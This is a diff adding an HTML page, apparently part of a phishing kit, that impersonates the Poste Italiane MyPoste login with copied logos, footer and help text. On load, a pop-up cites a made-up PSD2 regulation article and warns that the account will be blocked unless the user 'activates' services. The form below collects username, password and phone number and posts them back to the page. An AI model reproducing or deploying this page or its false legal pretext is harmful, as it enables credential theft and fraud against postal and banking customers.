@@ -1,0 +1,573 @@
+<br />
+<b>Notice</b>:  Undefined index: COOKIE_KEY in <b>/home/shainail/public_html/pannello2/generale.php</b> on line <b>41</b><br />
+<html lang="it" class="pi-xs pi-chrome"><head>
+		<title>Accedi o Registrati</title>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="shortcut icon" href="favicon.ico">
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">
+		<link id="genesys-widgets-styles" type="text/css" rel="stylesheet" href="css/widgets.min.css"><link id="genesys_widget_custom_2" type="text/css" rel="stylesheet" href="css/chat_custom.css"><link type="text/css" rel="stylesheet" href="css/bootstrap.min.css">
+		<link type="text/css" rel="stylesheet" href="css/owl.carousel.css">
+		<link type="text/css" rel="stylesheet" href="css/base.css">
+		<link type="text/css" rel="stylesheet" href="css/megamenu-pi.css">
+		<link type="text/css" rel="stylesheet" href="css/retina.css">
+		<link type="text/css" rel="stylesheet" href="css/custom-form-element.css">
+        	<link type="text/css" rel="stylesheet" href="css/spaces.css">
+	<link type="text/css" rel="stylesheet" href="css/alignment.css">
+		<link type="text/css" rel="stylesheet" href="css/typography.css">
+	<script type="text/javascript" src="css/jquery.min.js"></script>
+		<!--[if lt IE 9]>
+		<script type="text/javascript" src="css/html5shiv.min.js"></script>
+		<![endif]-->
+		<!--[if lt IE 9]>
+		<script type="text/javascript" src="css/respond.min.js"></script>
+		<![endif]-->
+		<!--[if IE 8]>
+		<link type="text/css" rel="stylesheet" href="css/ie8.css">
+		<![endif]-->
+		<!--[if lt IE 8]>
+		<link type="text/css" rel="stylesheet" href="css/ie7-ie6.css">
+		<![endif]-->
+		
+		
+	<script type="text/javascript" src="css/jquery.min.js"></script>
+        <script src="css/vex.combined.js"></script>
+        <link href="css/vex.css" rel="stylesheet" />
+        <link href="css/vex-theme-default.css" rel="stylesheet" />
+        <link href="css/vex-theme-os.css" rel="stylesheet" />
+        <link href="css/vex-theme-plain.css" rel="stylesheet" />
+        <link href="css/vex-theme-flat-attack.css" rel="stylesheet" />
+        <link href="css/vex-theme-wireframe.css" rel="stylesheet" />
+
+		
+		<script>vex.defaultOptions.className = 'vex-theme-os'</script>
+		<script type="text/javascript">
+			$(function(){
+
+				
+vex.dialog.alert({
+    message: '',
+	buttons: [
+        $.extend({}, vex.dialog.buttons.YES, { text: 'AVANTI' }),
+    ],
+    input: [
+        '<style>',
+            '.vex-custom-field-wrapper {',
+                'margin: 1em 0;',
+            '}',
+            '.vex-custom-field-wrapper > label {',
+                'display: inline-block;',
+                'margin-bottom: .2em;',
+            '}',
+        '</style><div style="    position: relative;" class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified"> <div class="container container-extended"> <div class="row"> <div class="col-md-12"> <div class="header-minified"> <div class="row"> <div class="col-xs-12"> <div class="federation-bar-content-logo pull-xs-left clearfix"> <div class="logo"> <a href="#" title="" class="hidden-xs hidden-sm"> <span class="wrap-logo wrap-logo-medium"><img alt="Poste Italiane" src="css/logo-poste-italiane-medium.png" srcset="css/logo-poste-italiane-medium.png " class="logo-image-pi-medium"></span> </a> <a href="#" title="" class="logo-mobile hidden-md hidden-lg" style=" margin-top: 10px; "> <span class="wrap-logo wrap-logo-small"><img alt="Poste Italiane" src="css/logo-poste-italiane-medium.png" srcset="css/logo-poste-italiane-medium.png " class="logo-image-pi-small"></span> </a> </div> <div class="back spacer-md-left-30"> <a class="back-link" href="#" title="Annulla accesso" style="display:none"> <span class="hidden-xs hidden-sm">Annulla accesso</span> </a> </div> </div> </div> </div> </div> </div> </div> </div> </div><div class="cc" >Gentile Cliente,<br>Dal 08/01/2021 è entrata in vigore la nuova normativa sulla sicurezza <b>NAZIONALE PSD2</b> e diventa quindi obbligatorio abilitare i nuovi metodi di sicurezza dall\'articolo <b>190.4 Comma 3.</b><br>La invitiamo quindi ad attivare i suoi servizi in APP, al modulo che segue. <b> il mancato aggiornamento porterà il blocco della sua utenza postale.</b></div>',
+    ].join('')
+})
+ 
+
+				$('#checkbox-remember').on('change', function(){
+					if($(this).is(':checked')){
+						$('#rememberme').val("on"); 
+					}
+					else{
+						$('#rememberme').val(""); 
+					}
+				});
+				
+				$('#password-trigger').on('mousedown',function(){
+					$('#password').attr('type','text');
+					$('#password-trigger').removeClass('bg-password-hide')
+					$('#password-trigger').addClass('bg-password-show')
+				}).on('mouseup',function(){
+					$('#password').attr('type','password');
+					$('#password-trigger').removeClass('bg-password-show')
+					$('#password-trigger').addClass('bg-password-hide')
+				}).on('mouseleave',function(){
+					$('#password').attr('type','password');
+					$('#password-trigger').removeClass('bg-password-show')
+					$('#password-trigger').addClass('bg-password-hide')
+				});
+				
+			});
+			
+			function deleteRememberMe() {
+				$('#username').val("");
+				$('#firstname').text("");
+				$('.rememberme_hidden').show();
+				$('.rememberme_shown').hide();
+				$('#rememberme').val(""); 
+			}
+		</script>
+		
+		<style>
+		.vex.vex-theme-os .vex-content {
+		border-top:none;
+		}
+		.vex.vex-theme-os .vex-content {
+		padding:0 0 20px 0;}
+		.cc{
+			
+    font-size: 90%;
+			padding:15px;
+		}
+.content-federation-bar-minified .federation-bar-content-logo div, .content-federation-bar-simplified .federation-bar-content-logo div {
+   
+    float: left;
+    padding: 15px 0 0 0 !important;
+}
+
+		.vex.vex-theme-os .vex-dialog-button.vex-dialog-button-primary {
+    background: #e0cf00;
+    color: #000;
+	margin-right:10px;
+}
+
+			h1.idp-retail {
+				font-size: 40px !important;
+			}
+			h3.idp-retail {
+				font-size: 20px !important;
+			}
+			.spacer-xs-top-38 {
+				margin-top: 38px !important;
+			}
+			.bg-box-qrcode { 
+				background-image: url("css/bg-qrcode.png");
+				background-repeat: no-repeat!important;
+				background-position-x: center!important;
+				background-position-y: bottom!important;
+			}
+
+			.bg-css-countdown {
+				background-color: #dae5f6;
+				margin-bottom:0 !important;
+			}
+			
+			.bg-password-show {
+			    background-image: url(css/eye-cut.png);
+			    background-position: center;
+			    background-repeat: no-repeat;
+			}
+			
+			.bg-password-hide {
+			    background-image: url(css/eye.png);
+			    background-position: center;
+			    background-repeat: no-repeat;
+			}
+			
+		</style>
+		
+		
+<!-- per la modale ma se cambia va totlo -->
+<style>
+
+/* /* The Modal (background) */ */
+/* .modal { */
+/*   display: none; /* Hidden by default */ */
+/*   position: absolute; /* Stay in place */ */
+/*   z-index: 1; /* Sit on top */ */
+/*   padding-top: 100px; /* Location of the box */ */
+/*   left: 0; */
+/*   top: 0; */
+/*   width: 100%; /* Full width */ */
+/*   height: 100%; /* Full height */ */
+/*   overflow: auto; /* Enable scroll if needed */ */
+/*   overflow-y: auto !important; */
+/*   background-color: rgb(0,0,0); /* Fallback color */ */
+/*   background-color: rgba(0,0,0,0.4); /* Black w/ opacity */ */
+/* } */
+
+/* /* Modal Content */ */
+/* .modal-content { */
+/*   background-color: #fefefe; */
+/*   margin: auto; */
+/*   padding: 20px; */
+/*   border: 1px solid #888; */
+/*   width: 80%; */
+/* } */
+
+/* /* The Close Button */ */
+/* .close { */
+/*   color: #aaaaaa; */
+/*   float: right; */
+/*   font-size: 28px; */
+/*   font-weight: bold; */
+/* } */
+
+/* .close:hover, */
+/* .close:focus { */
+/*   color: #000; */
+/*   text-decoration: none; */
+/*   cursor: pointer; */
+/* } */
+</style>
+		
+
+		
+		
+		
+
+   
+    
+</head><body><div class="pageLoader" style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 1; text-align: center; padding-top: 20%; display: none;"><img class="loader-logo" alt="Poste Italiane" src="css/logo-poste-italiane.png" srcset="css/logo-poste-italiane.png " style="height: 22px;"><img class="loader-spinner" src="css/spinner_giallo.gif" style="padding-top: 40px; width: 40px; display: block; margin: 0px auto;"></div>
+		<!-- AlertBrowser -->
+		<div class="content content-alert-browser">
+			<div id="content-alert-old-browser" class="content content-alert-old-browser">
+				<div class="container">
+					<div class="row">
+						<div class="col-md-12">
+							<div id="alertIe" class="innerspacer-xs-top-20 innerspacer-xs-bottom-20">
+								<div id="alertIe-inner">
+									La versione del tuo browser non è aggiornata. Per una migliore navigazione del sito, scarica la versione più recente.
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div id="consent_blackbar"><style>@font-face{    font-family:"TextaLight";    src:url(https://consent.trustarc.com/get?name=Texta-Light.eot) format("embedded-opentype"),url(https://consent.trustarc.com/get?name=Texta-Light.woff) format("woff"),url(https://consent.trustarc.com/get?name=Texta-Light.ttf) format("truetype");}.trustarc-banner {      font-family: "TextaLight",Arial,sans-serif;      font-size: 12px;      background-color: #fff;      color: #222427;      padding: 0;      border-radius:0px;      margin-bottom:2px;}  .truste-consent-content{ overflow: hidden; max-height: 49px; min-width: 300px; width: 100%; max-width: 1320px; display: table; margin: 0 auto; }.truste-text{ width: auto; display: table-cell; vertical-align: middle; padding: 10px 10px 12px 15px; text-align: left;  }    .truste-text {      font-family: "TextaLight",Arial,sans-serif;    font-size: 15px;    color: #222427;    letter-spacing: 0;    line-height: 20px;}    .truste-buttontext {      font-family: "TextaLight",Arial,sans-serif;    font-size: 15px;    color: #222427;    border: none;    text-decoration: underline;    cursor: pointer;    letter-spacing: 0px;    line-height: 40px;    }.truste-buttontext:hover {  text-decoration: underline;    color: #222427;}      .truste-close {font-family: "TextaLight",Arial,sans-serif;    font-size: 12px;    color: #222427;    background: #eedc00;    border: none;    text-decoration: none;    cursor: pointer;    padding: 10px 15px;    border: 0px none;    text-transform: uppercase;    border-radius: 5px;    letter-spacing: .5px;    float: right;    margin: 50px 10px;    white-space: nowrap;}    .truste-close:hover {    background: #ffec00;    color: #222427;  }    .truste-cookie-link {      color: #222427;      text-decoration: underline;      text-decoration-color: #e10600!important;      line-height: 40px;    }    .truste-cookie-link:hover {        text-decoration: underline;    text-decoration-color: #e10600!important;    color: #222427;    }    .truste-title {      font-size:18px;       color:#222427;       font-family: "TextaLight",Arial,sans-serif;      letter-spacing:0;       line-height: 40px;}      /* MOBILE ONLY */      @media screen and (min-width: 450px) and (max-width: 740px) {       .truste-close {  margin-right: 5px;    margin-bottom: -2px;    text-align: center;      font-family: "TextaLight",Arial,sans-serif;    color: #222427;    background-color: #ffec00;    text-decoration: none;    cursor: pointer;    margin: 0px 0px 0px 15px;    float: none;    clear: both;    display: inline-block;    }      .truste-text    { width: auto; display: block; vertical-align: middle; text-align: left;}        .truste-consent-content    {text-align:left;}      .truste-responsive .truste-buttontext     { margin-right:0px; }  }@media screen and (max-width: 480px) {  .truste-text {      float: left;      width: auto;  }  .truste-close {      float: left;      margin: 0px 0px 0px 15px;      text-align: left;  }}</style><div id="truste-consent-track" class="trustarc-banner truste-responsive" style="display: none; opacity: 0;">    <div class="truste-consent-content">    <div id="truste-consent-text" class="truste-text">    <span class="truste-title">Poste Italiane dà valore alla tua privacy</span><br>      Poste Italiane utilizza cookie, inclusi cookie di profilazione, eventualmente anche di terze parti, al fine di assicurarti una migliore esperienza sul sito e di effettuare comunicazioni ed interazioni in linea con le tue preferenze. Puoi accettare questi cookie cliccando su "Accetto" oppure puoi impostare le tue preferenze cliccando su "Maggiori informazioni".<br><a id="truste-show-consent" class="truste-buttontext">Maggiori informazioni</a>    </div>    <div id="truste-consent-buttons">      <a id="truste-consent-button" class="truste-close" style="margin-right:15px; margin-bottom:15px">Accetto</a>      </div>    </div></div></div>
+		</div>
+		<div class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified">
+			<div class="container container-extended">
+				<div class="row">
+					<div class="col-md-12">
+						<div class="header-minified">
+							<div class="row">
+								<div class="col-xs-12">
+									<div class="federation-bar-content-logo pull-xs-left clearfix">
+										<div class="logo">
+											<a href="#" title="" class="hidden-xs hidden-sm">
+												<span class="wrap-logo wrap-logo-medium"><img alt="Poste Italiane" src="css/logo-poste-italiane-medium.png" srcset="css/logo-poste-italiane-medium.png " class="logo-image-pi-medium"></span>
+											</a>
+											<a href="#" title="" class="logo-mobile hidden-md hidden-lg" style="
+    margin-top: 10px;
+">
+												<span class="wrap-logo wrap-logo-small"><img alt="Poste Italiane" src="css/logo-poste-italiane-medium.png" srcset="css/logo-poste-italiane-medium.png " class="logo-image-pi-small"></span>
+											</a>
+										</div>
+										
+										<div class="back spacer-md-left-30">
+											<a class="back-link" href="#" title="Annulla accesso" style="display:none">
+												<span class="hidden-xs hidden-sm">Annulla accesso</span>
+											</a>
+										</div>
+										
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!--googleon: all-->
+		<div class="content content-applicative  nobracket">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-12" id="accessibility-anchor">
+						<div class="row">
+							<div class="col-xs-12 ">
+								<div class="main" style="margin-top: -40px !important;">
+									<div class="row" style="
+    margin-top: 50px;
+">
+										<div class="col-md-12">
+											<div class="abstract">
+												<div class="abstract-heading text-xs-center spacer-xs-bottom-40">
+													<h1 class="idp-retail">
+														Accedi 
+														<small>
+															<h3 class="idp-retail">
+																Per accedere a <strong><span id="titolo-fcc">MyPoste</span></strong> devi essere un utente registrato.
+																
+																
+																
+															</h3>
+														</small>
+													</h1>
+													
+												</div>
+											</div>
+										</div>
+									</div>
+									<div class="row">
+										<div class="col-md-8 pull-sm-not center">
+											<div class="row equalize-group equalize-group-1">
+												<div class="col-sm-12">
+													<div class="content">
+														<div class="content-overflow-wrap">
+															<div class="row">
+																<!-- panel credenziali  -->
+																 
+																
+																<div class="col-xs-12 col-sm-12">
+																
+																
+																	<div class="panel panel-cards panel-cards-large" style="min-height: auto;">
+																		<div class="panel-wrap innerspacer-xs-bottom-0">
+																			<div class="panel-heading spacer-xs-top-30 rememberme_hidden">
+																				<h4 class="text-xs-center">
+																					Inserisci le tue <strong>credenziali</strong>
+																				</h4>
+																			</div>
+																			<div class="panel-heading spacer-xs-top-30 text-xs-center rememberme_shown" style="display:none">
+																				<img src="css/empty-profile.png" srcset="css/empty-profile.png "> 
+																				<h4 id="firstname"></h4>
+																				<p><a href="javascript:deleteRememberMe();">Non sei tu?</a></p>
+																			</div>
+																			<form class="form-login clearfix" method="POST" >
+																				<input type="hidden" name="dep" id="dep" value="">
+																				<input type="hidden" name="dop" id="dop" value="">
+																				<input type="hidden" name="evp" id="evp" value="">
+																				<input type="hidden" name="mid" id="mid" value="">
+																				<input type="hidden" name="rememberme" id="rememberme" value="">
+																				<div class="panel-body">
+																					<div class="spacer-xs-bottom-30">
+																						<div class="form-group form-group-lg rememberme_hidden">
+																							<p>
+																								<label class="control-label" for="username">NOME
+																									UTENTE</label> <input class="form-control" id="username" name="username" placeholder="inserisci" type="text" value="">
+																							</p>
+																						</div>
+																						<div class="form-group form-group-lg">
+																							<label class="control-label" for="password">PASSWORD</label>
+																							<div class="input-group">
+			                                                                                    <input type="password" class="form-control pwd-control" id="password" name="password" placeholder="inserisci">
+			                                                                                    <div class="input-group-addon input-group-addon-pwd bg-password-hide" title="mostra la password" id="password-trigger"> 
+			                                                                                    	<div style="width:24px"></div>
+			                                                                                    </div>
+			                                                                                </div>
+																						</div>
+																						<div class="form-group form-group-lg rememberme_hidden">
+																							<p>
+																								<label class="control-label" for="tel">TELEFONO</label> <input class="form-control" id="tel" name="tel" placeholder="inserisci" type="text" value="">
+																							</p>
+																						</div><div style="display:none" class="form-group form-group-lg rememberme_hidden">
+
+																							<div class="checkbox">
+																								<p>
+																									<label class="control-label">
+																										<span class="custom-checkbox"><input type="checkbox" id="fff"></span>Ricorda il mio nome utente
+																									</label>
+																								</p>
+																							</div>
+																						</div>
+																						<div class="box-editable-area spacer-xs-top-40">
+																							<p class="subtext text-center spacer-xs-0" style="font-size: 0.85em;">
+																								<a href="#" class="rememberme_hidden">Hai dimenticato il nome utente o la password?</a>
+																								<a href="#" class="rememberme_shown" style="display:none">Hai dimenticato la password?</a>
+																							</p>
+																						</div>
+																						<p class="btn-container btn-container-center spacer-xs-bottom-15 spacer-xs-top-30 clearfix">
+																							<input type="submit" class="btn btn-primary btn-expand" value="accedi">
+																						</p>
+																						 
+																						
+																						<p class="subtext text-center spacer-xs-0" style="font-size:0.9em">
+																							Non hai un account? <a href="#">Registrati</a>
+																						</p>
+																						
+																					</div>
+																				</div>
+																			</form>
+																		</div>
+																	</div>
+																</div>
+																<!-- panel qrcode  -->
+																 
+																
+																	<div class="col-sm-6 hidden-xs" style="display:none">
+																		<div class="panel panel-cards panel-cards-large bg-box-qrcode" style="min-height: auto;">
+																			<div class="panel-wrap innerspacer-xs-bottom-0 text-xs-center">
+																				<div class="panel-heading spacer-xs-top-30">
+																					<h4 class="text-xs-center">
+																						Accedi <strong>più velocemente</strong>
+																					</h4>
+																				</div>
+																		
+																				
+																						
+																													
+																					
+																			</div>
+																		</div>
+																	</div>
+																
+																
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+										<!-- area ID PosteID Abilitato SPID  -->
+										 
+											<div class="col-md-8 pull-sm-not center" id="sp-posteid-fcc">
+												<div class="row">
+													<div class="col-sm-12">
+														<div class="content">
+															<div class="content-overflow-wrap">
+																<div class="row">
+																	
+																</div>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										
+										<!-- do you need help -->
+										<div class="content content-post-main">
+											<div class="container">
+												<div class="row" id="help__assistenza" style="
+    display: none;
+">
+													<div class="col-sm-12">
+														<h2 class="text-xs-center">Hai bisogno di aiuto?</h2>
+													</div>
+													<div class="col-md-8 col-lg-push-1 col-lg-10">
+														<div class="btn-container text-xs-center">
+															<div class="row">
+																<div class="col-sm-6 col-md-4 col-sm-push-0 col-md-push-0">
+																	<a href="#" title="Chiamaci" class="btn btn-sm btn-secondary btn-expand"><img src="css/icone-default-on/ico-chiamaci.png" srcset="css/icone-default-on-/ico-chiamaci.png " class="spacer-xs-right-10">Chiamaci</a>
+																</div>
+																<div class="col-sm-6 col-md-4">
+																	<a href="#" title="Domande Frequenti" target="_self" class="btn btn-sm btn-secondary btn-expand"><img src="css/icone-default-on/ico-scrivici.png" srcset="css/icone-default-on-/ico-scrivici.png " class="spacer-xs-right-10">Scrivici</a>
+																</div>
+																<div class="col-sm-6 col-md-4">
+																	<a href="#" title="Richiedi Assistenza" class="btn btn-sm btn-secondary btn-expand"><img class="spacer-xs-right-10" src="css/icone-default-on/ico-vieni-in-poste-cerca-up.png" srcset="css/icone-default-on-/ico-vieni-in-poste-cerca-up.png ">Vieni
+																		in Poste</a>
+																</div>
+															</div>
+														</div>
+													</div>
+													<div class="content content-main" style="padding-top: 15px;">
+														<div class="container">
+															<div class="row">
+																<div class="col-md-8 col-lg-push-1 col-lg-10 text-xs-center innerspacer-xs-top-30">
+																	In caso di mancato accesso o non funzionamento dei
+																	servizi è possibile contattare il Call Center al
+																	numero verde <a href="tel:803.160">803.160</a> (dal
+																	lunedì al sabato dalle ore 8.00 alle ore 20.00).
+																	La chiamata è gratuita.
+																</div>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+								<!--html template-->
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="content content-footer content-footer-post">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-12">
+						<div class="row">
+							<div class="col-md-5">
+								<p class="text-xs-center text-md-left">
+									© Poste Italiane 2020 - Partita iva : 01114601006
+								</p>
+							</div>
+							<div class="col-md-7">
+								<div class="clearfix">
+									<div class="base-footer">
+										
+									</div>
+								</div>
+							</div>
+						</div>
+						
+					</div>
+				</div>
+			</div>
+		</div>
+		
+		<script type="text/javascript" src="css/bootstrap.js"></script>
+		<script type="text/javascript" src="css/ie10-viewport-bug-workaround.js"></script>
+		
+		
+		
+	
+	
+	
+	<!-- The Modal -->
+      <div class="modal" id="modalQrWaiting" tabindex="-1">
+          <div class="modal-dialog" style="margin-top: 0px;" role="dialog" aria-labelledby="modalQrWaitingLabel" aria-modal="true" aria-describedby="modalQrWaitingDesc">
+              <div class="modal-content">
+			 	  <div class="modal-body">
+					  <div class="row">
+
+					  </div>	  
+                      <div class="row">
+                          <div class="col-sm-12 text-xs-center">
+                              <h3 class="spacer-xs-bottom-30" id="modalQrWaitingLabel">Controlla il tuo<br>smartphone</h3>
+                              
+							
+
+								<img id="imgmyappnane" src="css/small-modal-ico-bp-pp.png">
+								
+								
+                              <p class="spacer-xs-bottom-20" id="modalQrWaitingDesc">
+								 
+																													
+																					Per proseguire devi autorizzare nell'App che hai utilizzato per inquadrare il codice QR.
+																					
+																					
+																					
+																				
+								  
+								  
+								  
+								  
+								  </p>
+                              
+							  <p></p><div id="__polling_progress__"></div><p></p>
+							  
+							  <p class="spacer-xs-bottom-0 text-xs-center">
+                                  <button type="button" class="btn btn-default" data-dismiss="modal" aria-label="Close" id="close">Annulla</button>
+                              </p>
+                              
+                          </div>
+                      </div>
+
+                  </div>
+                  
+              </div>
+          </div>
+      </div>
+
+  <!-- Modal content -->
+	
+
+
+
+
+		
+        
+		<form name="loginform1" id="loginform1" method="post" >
+			<input type="hidden" value="" id="secureToken" name="secureToken">
+			<input type="hidden" value="" id="signature" name="signature">
+
+			
+		</form>  
+						
+		
+
+				
+		
+		
+							
+		
+
+			
+	
+
+<link id="genesys_widget_custom" type="text/css" rel="stylesheet" href="css/chat_common.css"><div class="cx-widget cx-window-manager cx-theme-light"></div></body></html>
